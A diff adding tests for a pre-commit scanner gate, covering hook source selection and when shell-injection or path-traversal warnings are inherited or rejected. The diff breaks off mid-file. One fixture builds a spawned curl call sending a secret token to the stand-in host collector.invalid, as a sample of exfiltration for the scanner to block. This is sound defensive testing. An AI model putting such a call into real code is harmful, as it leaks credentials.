@@ -1,5 +1,5 @@
 import assert from 'node:assert/strict';
-import { execFileSync } from 'node:child_process';
+import { execFileSync, spawnSync } from 'node:child_process';
 import { describe, it } from 'node:test';
 import * as fs from 'node:fs';
 import * as os from 'node:os';
@@ -18,9 +18,104 @@ const highWarning: ScannerWarning = {
   evidence: String.fromCharCode(96) + 'safe ${value}' + String.fromCharCode(96),
 };
 
+describe('pre-commit file source selection', () => {
+  for (const mode of ['ordinary hook', 'linked-worktree hook', 'CI argv replay']) {
+    it(`scans the intended content in ${mode}`, () => {
+      const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'commander-hook-source-'));
+      const primary = process.cwd();
+      const repository = path.join(tempRoot, 'repository');
+      const cwd = mode === 'linked-worktree hook' ? path.join(tempRoot, 'linked') : repository;
+      const fixture = 'hook-source-fixture.ts';
+      const safe = "export const value = 'safe';\n";
+      const high = ['sp', 'awn', '('].join('') + 'dangerous()\n';
+      const env = { ...process.env };
+      for (const key of Object.keys(env)) {
+        if (key.startsWith('GIT_')) delete env[key];
+      }
+      delete env.CORE_PRECOMMIT_HOOK;
+      const git = (directory: string, args: string[]) =>
+        execFileSync('git', args, { cwd: directory, env, encoding: 'utf8', stdio: 'pipe' });
+
+      try {
+        fs.mkdirSync(repository);
+        git(repository, ['init']);
+        git(repository, ['config', 'core.hooksPath', path.join(repository, '.git', 'hooks')]);
+        git(repository, ['config', 'user.name', 'Hook Test']);
+        git(repository, ['config', 'user.email', 'hook-test@example.com']);
+        git(repository, [
+          '-c',
+          'core.hooksPath=/dev/null',
+          'commit',
+          '--no-gpg-sign',
+          '--allow-empty',
+          '-m',
+          'fixture',
+        ]);
+        if (cwd !== repository) git(repository, ['worktree', 'add', '--detach', cwd]);
+        for (const directory of ['node_modules', 'packages']) {
+          fs.symlinkSync(
+            path.join(primary, directory),
+            path.join(cwd, directory),
+            process.platform === 'win32' ? 'junction' : 'dir',
+          );
+        }
+        const hook = path.join(repository, '.git', 'hooks', 'pre-commit');
+        fs.writeFileSync(
+          hook,
+          '#!/bin/sh\nexport CORE_PRECOMMIT_HOOK=1\n' +
+            'exec "$HOOK_TEST_NODE" --import tsx "$HOOK_TEST_SCRIPT"\n',
+          { mode: 0o755 },
+        );
+        const runHook = () =>
+          spawnSync(
+            mode === 'CI argv replay' ? process.execPath : 'git',
+            mode === 'CI argv replay'
+              ? ['--import', 'tsx', path.join(primary, 'scripts/precommitHook.ts'), fixture]
+              : ['hook', 'run', 'pre-commit'],
+            {
+              cwd,
+              encoding: 'utf8',
+              env: {
+                ...env,
+                ...(mode === 'CI argv replay' ? { CORE_PRECOMMIT_HOOK: '1' } : {}),
+                HOOK_TEST_NODE: process.execPath,
+                HOOK_TEST_SCRIPT: path.join(primary, 'scripts/precommitHook.ts'),
+              },
+            },
+          );
+
+        fs.writeFileSync(path.join(cwd, fixture), mode === 'CI argv replay' ? safe : high);
+        git(cwd, ['add', fixture]);
+        fs.writeFileSync(path.join(cwd, fixture), mode === 'CI argv replay' ? high : safe);
+        const blocked = runHook();
+        assert.equal(blocked.status, 1, blocked.stdout + blocked.stderr);
+        assert.match(
+          blocked.stdout + blocked.stderr,
+          new RegExp(`Scanning 1 staged files via ${mode === 'CI argv replay' ? 'argv' : 'git'}`),
+          blocked.stderr,
+        );
+        assert.match(blocked.stderr, /precommit scanner gate failed/);
+
+        fs.writeFileSync(path.join(cwd, fixture), mode === 'CI argv replay' ? high : safe);
+        git(cwd, ['add', fixture]);
+        fs.writeFileSync(path.join(cwd, fixture), mode === 'CI argv replay' ? safe : high);
+        const allowed = runHook();
+        assert.equal(allowed.status, 0, allowed.stdout + allowed.stderr);
+        assert.match(allowed.stdout + allowed.stderr, /all gates passed/);
+      } finally {
+        fs.rmSync(tempRoot, { recursive: true, force: true });
+      }
+    });
+  }
+});
+
 describe('pre-commit scanner index policy', () => {
-  it('records an inherited high warning without allowing its raw evidence into the audit record', () => {
-    const result = evaluateIndexedWarnings([highWarning], [highWarning]);
+  it('records an unchanged inherited high warning without allowing its raw evidence into the audit record', async () => {
+    const content = 'const value = ' + highWarning.evidence + ';\n';
+    const scan = (candidate: string): readonly ScannerWarning[] =>
+      candidate.includes(highWarning.evidence) ? [highWarning] : [];
+    const warnings = await enumerateHighWarnings(content, scan);
+    const result = evaluateIndexedWarnings(warnings, warnings);
 
     assert.deepEqual(result.violations, []);
     assert.equal(result.inherited.length, 1);
@@ -35,8 +130,697 @@ describe('pre-commit scanner index policy', () => {
     assert.equal(result.violations[0]!.reason, 'new_high_warning');
   });
 
-  it('rejects an additional occurrence of an inherited high warning', () => {
-    const result = evaluateIndexedWarnings([highWarning, highWarning], [highWarning]);
+  it('rejects a generic process warning when its source hunk changes to exfiltration', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline = 'const child = ' + processCreationCall + "'node', ['--version']);\n";
+    const changed =
+      'const child = ' +
+      processCreationCall +
+      "'curl', ['https://collector.invalid/?token=' + secret]);\n";
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('does not inherit when a referenced producer changes outside the warning line', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline =
+      "function run() {\n  const command = 'node';\n  const first = 1;\n  const second = 2;\n  const third = 3;\n  const child = " +
+      processCreationCall +
+      'command, []);\n}\n';
+    const changed = baseline.replace("const command = 'node';", 'const command = process.argv[2];');
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('does not inherit an unresolved destructured command when its source changes', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    for (const binding of ['{ command }', '[command]']) {
+      const baseline =
+        'function run() {\n  const ' +
+        binding +
+        ' = safeSource;\n  const child = ' +
+        processCreationCall +
+        'command, []);\n}\n';
+      const changed = baseline.replace('safeSource', 'process.argv');
+
+      const inherited = evaluateIndexedWarnings(
+        await enumerateHighWarnings(baseline, scan),
+        await enumerateHighWarnings(baseline, scan),
+      );
+      const result = evaluateIndexedWarnings(
+        await enumerateHighWarnings(changed, scan),
+        await enumerateHighWarnings(baseline, scan),
+      );
+
+      assert.equal(inherited.inherited.length, 1);
+      assert.equal(inherited.violations.length, 0);
+      assert.equal(result.inherited.length, 0);
+      assert.equal(result.violations.length, 1);
+      assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+    }
+  });
+
+  it('does not inherit when a nested destructuring fallback write changes', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline =
+      "function run() {\n  let fallback = { command: 'node' };\n  fallback = { command: 'node' };\n  const source = {};\n  const { nested: { command } = fallback } = source;\n  const child = " +
+      processCreationCall +
+      'command, []);\n}\n';
+    const changed = baseline.replace("fallback = { command: 'node' };", 'fallback = process.argv;');
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('binds an unresolved call to its lexical scope, statement, and guard', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline =
+      "function run() {\n  const note = 'before';\n  if (externalGuard) { const child = " +
+      processCreationCall +
+      'externalCommand, []); }\n}\n';
+    const unrelated = baseline.replace("const note = 'before';", "const note = 'after';");
+    const changedGuard = baseline.replace('externalGuard', '!externalGuard');
+
+    const inherited = evaluateIndexedWarnings(
+      await enumerateHighWarnings(unrelated, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+    const rejected = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changedGuard, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(inherited.violations.length, 0);
+    assert.equal(inherited.inherited.length, 1);
+    assert.equal(rejected.inherited.length, 0);
+    assert.equal(rejected.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('does not inherit when a command variable is reassigned before an unchanged call', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline =
+      "function run() {\n  let command = 'node';\n  command = 'node';\n  const child = " +
+      processCreationCall +
+      'command, []);\n}\n';
+    const changed = baseline.replace("\n  command = 'node';", '\n  command = process.argv[2];');
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('does not inherit when control flow changes around an unchanged call', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline =
+      "function run() {\n  const command = 'node';\n  const trusted = true;\n  if (trusted) {\n    const child = " +
+      processCreationCall +
+      'command, []);\n  }\n}\n';
+    const changed = baseline.replace('if (trusted)', 'if (!trusted)');
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('inherits when only an unrelated sibling statement changes', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline =
+      "function run() {\n  const command = 'node';\n  const diagnosticLabel = 'before';\n  const child = " +
+      processCreationCall +
+      'command, []);\n}\n';
+    const changed = baseline.replace(
+      "const diagnosticLabel = 'before';",
+      "const diagnosticLabel = 'after';",
+    );
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 1);
+    assert.equal(result.violations.length, 0);
+  });
+
+  it('inherits unchanged comment warnings across executable changes', async () => {
+    const evidence = String.fromCharCode(96) + 'user' + String.fromCharCode(96);
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(evidence)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Backtick command execution detected',
+              evidence,
+            },
+          ]
+        : [];
+    const baseline =
+      'function token() {\n  // The ' +
+      evidence +
+      " field is a claim.\n  return issue('before');\n}\n";
+    const changed = baseline.replace("issue('before')", "issue('after')");
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 1);
+    assert.equal(result.violations.length, 0);
+  });
+
+  it('rejects a comment warning when its comment context changes', async () => {
+    const evidence = String.fromCharCode(96) + 'user' + String.fromCharCode(96);
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(evidence)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Backtick command execution detected',
+              evidence,
+            },
+          ]
+        : [];
+    const baseline =
+      'function token() {\n  // The ' + evidence + ' field is a claim.\n  return issue();\n}\n';
+    const changed = baseline.replace('is a claim', 'must be verified');
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('inherits a template warning when an unrelated function body statement changes', async () => {
+    const evidence = String.fromCharCode(96) + 'safe ';
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(evidence)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Template command execution detected',
+              evidence,
+            },
+          ]
+        : [];
+    const baseline =
+      "function render(value) {\n  const label = 'before';\n  return " + evidence + ';\n}\n';
+    const changed = baseline.replace("const label = 'before';", "const label = 'after';");
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 1);
+    assert.equal(result.violations.length, 0);
+  });
+
+  it('inherits a template warning when an unrelated parameter default changes', async () => {
+    const evidence = String.fromCharCode(96) + 'safe ${value}' + String.fromCharCode(96);
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(evidence)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Template command execution detected',
+              evidence,
+            },
+          ]
+        : [];
+    const baseline =
+      "function render(value, diagnostic = 'before') {\n  return " + evidence + ';\n}\n';
+    const changed = baseline.replace("diagnostic = 'before'", "diagnostic = 'after'");
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 1);
+    assert.equal(result.violations.length, 0);
+  });
+
+  it('inherits a template warning nested in an unchanged call after an unrelated edit', async () => {
+    const evidence = String.fromCharCode(96) + 'endpoint/${path}' + String.fromCharCode(96);
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(evidence)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Template command execution detected',
+              evidence,
+            },
+          ]
+        : [];
+    const baseline =
+      "function request(path) {\n  headers.set('authorization', token);\n  return fetch(" +
+      evidence +
+      ');\n}\n';
+    const changed = baseline.replace(
+      "headers.set('authorization', token);",
+      "headers.set('x-api-key', token);",
+    );
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 1);
+    assert.equal(result.violations.length, 0);
+  });
+
+  it('inherits a template warning in an unchanged table entry after another entry changes', async () => {
+    const evidence =
+      String.fromCharCode(96) + '--data=${JSON.stringify(proposal)}' + String.fromCharCode(96);
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(evidence)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Template command execution detected',
+              evidence,
+            },
+          ]
+        : [];
+    const baseline =
+      "function routes(proposal) {\n  return it.each([\n    { args: ['simulate', " +
+      evidence +
+      "] },\n    { args: ['get', 'run-1'] },\n  ]);\n}\n";
+    const changed = baseline.replace("['get', 'run-1']", "['get', 'run-2']");
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 1);
+    assert.equal(result.violations.length, 0);
+  });
+
+  it('inherits warnings in returned and assigned callbacks after unrelated sibling edits', async () => {
+    const evidence = String.fromCharCode(96) + 'command=${value}' + String.fromCharCode(96);
+    const warning: ScannerWarning = {
+      severity: 'high',
+      category: 'pre_scan.shell_injection',
+      message: 'Template command execution detected',
+      evidence,
+    };
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(evidence) ? [warning] : [];
+    const sources = [
+      'function factory(value) {\n  return async () => {\n    const duration = 300;\n    return ' +
+        evidence +
+        ';\n  };\n}\n',
+      'function configure(fixture, value) {\n  fixture.read = async () => {\n    const duration = 300;\n    return ' +
+        evidence +
+        ';\n  };\n}\n',
+    ];
+
+    for (const baseline of sources) {
+      const changed = baseline.replace('const duration = 300;', 'const duration = 600;');
+      const result = evaluateIndexedWarnings(
+        await enumerateHighWarnings(changed, scan),
+        await enumerateHighWarnings(baseline, scan),
+      );
+
+      assert.equal(result.inherited.length, 1);
+      assert.equal(result.violations.length, 0);
+    }
+  });
+
+  it('inherits a response template when an unrelated request header changes', async () => {
+    const evidence =
+      String.fromCharCode(96) + 'failed (${response.status}): ${body}' + String.fromCharCode(96);
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(evidence)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Template command execution detected',
+              evidence,
+            },
+          ]
+        : [];
+    const baseline =
+      "function request(config) {\n  const headers = new Headers();\n  headers.set('authorization', config.apiKey);\n  return fetch(config.url, { headers });\n}\n\nasync function render(config) {\n  const response = await request(config);\n  const body = await response.text();\n  throw new Error(" +
+      evidence +
+      ');\n}\n';
+    const changed = baseline.replace("'authorization'", "'x-api-key'");
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 1);
+    assert.equal(result.violations.length, 0);
+  });
+
+  it('inherits a path warning when unrelated import specifiers change', async () => {
+    const evidence = ['..', '/..', '/src/cli/commands/action'].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(evidence)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.path_traversal',
+              message: 'Path traversal detected',
+              evidence,
+            },
+          ]
+        : [];
+    const baseline = "import { cmdAction } from '" + evidence + "';\n";
+    const changed =
+      "import {\n  cmdAction,\n  resolveActionApiConfig,\n} from '" + evidence + "';\n";
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 1);
+    assert.equal(result.violations.length, 0);
+  });
+
+  it('rejects template warnings when their dependencies, guard, or statement change', async () => {
+    const evidence = String.fromCharCode(96) + 'safe ';
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(evidence)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Template command execution detected',
+              evidence,
+            },
+          ]
+        : [];
+    const baseline =
+      "function render(value = 'safe') {\n  const trusted = true;\n  if (trusted) {\n    return " +
+      evidence +
+      '${value}' +
+      String.fromCharCode(96) +
+      ';\n  }\n}\n';
+    const changedSources = [
+      baseline.replace('${value}', '${other}'),
+      baseline.replace("value = 'safe'", 'value = process.argv[2]'),
+      baseline.replace('if (trusted)', 'if (!trusted)'),
+      baseline.replace(
+        'return ' + evidence + '${value}' + String.fromCharCode(96) + ';',
+        'return ' + evidence + '${value}' + String.fromCharCode(96) + '.trim();',
+      ),
+    ];
+
+    for (const changed of changedSources) {
+      const result = evaluateIndexedWarnings(
+        await enumerateHighWarnings(changed, scan),
+        await enumerateHighWarnings(baseline, scan),
+      );
+
+      assert.equal(result.inherited.length, 0);
+      assert.equal(result.violations.length, 1);
+      assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+    }
+  });
+
+  it('does not inherit when an unchanged call moves to another lexical scope', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const warningStatement =
+      "  const command = 'node';\n  const child = " + processCreationCall + 'command, []);\n';
+    const baseline = 'function first() {\n' + warningStatement + '}\nfunction second() {}\n';
+    const changed = 'function first() {}\nfunction second() {\n' + warningStatement + '}\n';
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('binds method and function-initializer warnings to their ancestor guards', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baselines = [
+      'class Runner { run() { if (trusted) { const child = ' +
+        processCreationCall +
+        "'node', []); } } }\n",
+      'const run = () => { if (trusted) { const child = ' +
+        processCreationCall +
+        "'node', []); } };\n",
+    ];
+
+    for (const baseline of baselines) {
+      const changed = baseline.replace('if (trusted)', 'if (!trusted)');
+      const result = evaluateIndexedWarnings(
+        await enumerateHighWarnings(changed, scan),
+        await enumerateHighWarnings(baseline, scan),
+      );
+      assert.equal(result.inherited.length, 0);
+      assert.equal(result.violations.length, 1);
+    }
+  });
+
+  it('binds a top-level warning to its complete top-level statement', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline = 'if (trusted) { const child = ' + processCreationCall + "'node', []); }\n";
+    const changed = baseline.replace('if (trusted)', 'if (!trusted)');
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+  });
+
+  it('binds an anonymous callback warning to its parent call and argument position', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline =
+      'function run() { return new Promise((resolve) => { const child = ' +
+      processCreationCall +
+      "'node', []); resolve(child); }); }\n";
+    const moved = baseline.replace('new Promise((resolve)', 'wrapper(0, (resolve)');
+
+    const inherited = evaluateIndexedWarnings(
+      await enumerateHighWarnings(baseline, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+    const rejected = evaluateIndexedWarnings(
+      await enumerateHighWarnings(moved, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(inherited.violations.length, 0);
+    assert.equal(inherited.inherited.length, 1);
+    assert.equal(rejected.inherited.length, 0);
+    assert.equal(rejected.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('fails closed when warning evidence has no stable enclosing source unit', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const content = '// ' + processCreationCall + "'node', []);\n";
+    const scan = (): readonly ScannerWarning[] => [
+      {
+        severity: 'high',
+        category: 'pre_scan.shell_injection',
+        message: 'Process creation call detected',
+        evidence: processCreationCall,
+      },
+    ];
+    const warnings = await enumerateHighWarnings(content, (candidate) =>
+      candidate.includes(processCreationCall) ? scan() : [],
+    );
+    const result = evaluateIndexedWarnings(warnings, warnings);
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'new_high_warning');
+  });
+
+  it('rejects an additional occurrence of an inherited high warning', async () => {
+    const content = 'const first = ' + highWarning.evidence + ';\n';
+    const scan = (candidate: string): readonly ScannerWarning[] =>
+      candidate.includes(highWarning.evidence) ? [highWarning] : [];
+    const baseline = await enumerateHighWarnings(content, scan);
+    const staged = await enumerateHighWarnings(content + content, scan);
+    const result = evaluateIndexedWarnings(staged, baseline);
 
     assert.equal(result.violations.length, 1);
     assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
@@ -246,6 +1030,165 @@ describe('pre-commit scanner index policy', () => {
       ]).trim();
       git(linked, ['update-ref', 'HEAD', commit]);
       git(linked, ['mv', original, renamed]);
+
+      assert.throws(runHook, /precommit scanner gate failed/);
+    } finally {
+      try {
+        git(primary, ['worktree', 'remove', '--force', linked]);
+      } finally {
+        fs.rmSync(tempRoot, { recursive: true, force: true });
+      }
+    }
+  });
+
+  it('does not inherit a template warning relocated between table entries', async () => {
+    const evidence = String.fromCharCode(96) + 'command=${value}' + String.fromCharCode(96);
+    const warning: ScannerWarning = {
+      severity: 'high',
+      category: 'pre_scan.shell_injection',
+      message: 'Template command execution detected',
+      evidence,
+    };
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(evidence) ? [warning] : [];
+    const baseline =
+      "function commands(value) {\n  return [\n    { name: 'preview', args: [" +
+      evidence +
+      "] },\n    { name: 'apply', args: [] },\n  ];\n}\n";
+    const changed =
+      "function commands(value) {\n  return [\n    { name: 'preview', args: [] },\n    { name: 'apply', args: [" +
+      evidence +
+      '] },\n  ];\n}\n';
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('does not inherit a top-level template warning when its binding kind changes', async () => {
+    const evidence = String.fromCharCode(96) + 'command=${value}' + String.fromCharCode(96);
+    const warning: ScannerWarning = {
+      severity: 'high',
+      category: 'pre_scan.shell_injection',
+      message: 'Template command execution detected',
+      evidence,
+    };
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(evidence) ? [warning] : [];
+    const baseline = 'const command = ' + evidence + ';\n';
+    const changed = 'let command = ' + evidence + ';\n';
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('does not inherit a warning moved from a static method to an instance method', async () => {
+    const evidence = String.fromCharCode(96) + 'command=${value}' + String.fromCharCode(96);
+    const warning: ScannerWarning = {
+      severity: 'high',
+      category: 'pre_scan.shell_injection',
+      message: 'Template command execution detected',
+      evidence,
+    };
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(evidence) ? [warning] : [];
+    const baseline =
+      'class Runner {\n  static execute(value) {\n    return ' + evidence + ';\n  }\n}\n';
+    const changed = 'class Runner {\n  execute(value) {\n    return ' + evidence + ';\n  }\n}\n';
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('does not inherit a warning moved between same-name nested functions in guarded blocks', async () => {
+    const evidence = String.fromCharCode(96) + 'command=${value}' + String.fromCharCode(96);
+    const warning: ScannerWarning = {
+      severity: 'high',
+      category: 'pre_scan.shell_injection',
+      message: 'Template command execution detected',
+      evidence,
+    };
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(evidence) ? [warning] : [];
+    const baseline =
+      'function dispatch(value, preview) {\n  if (preview) {\n    function execute() {\n      return ' +
+      evidence +
+      ";\n    }\n    return execute();\n  }\n  if (!preview) {\n    function execute() {\n      return 'safe';\n    }\n    return execute();\n  }\n}\n";
+    const changed =
+      "function dispatch(value, preview) {\n  if (preview) {\n    function execute() {\n      return 'safe';\n    }\n    return execute();\n  }\n  if (!preview) {\n    function execute() {\n      return " +
+      evidence +
+      ';\n    }\n    return execute();\n  }\n}\n';
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('fails closed for an oversized staged source under .commander', () => {
